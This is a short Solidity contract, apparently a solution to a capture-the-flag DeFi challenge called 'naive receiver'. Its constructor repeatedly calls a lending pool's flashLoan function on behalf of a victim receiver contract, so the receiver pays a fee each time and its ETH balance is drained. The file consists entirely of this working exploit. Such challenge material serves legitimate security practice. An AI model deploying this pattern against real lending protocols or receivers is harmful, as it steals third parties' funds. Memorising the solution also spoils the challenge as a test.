// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveAttacker {
    constructor(address payable pool, address payable receiver) payable {
        for (uint i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(receiver),
                NaiveReceiverLenderPool(pool).ETH(),
                0,
                ""
            );
        }
    }
}
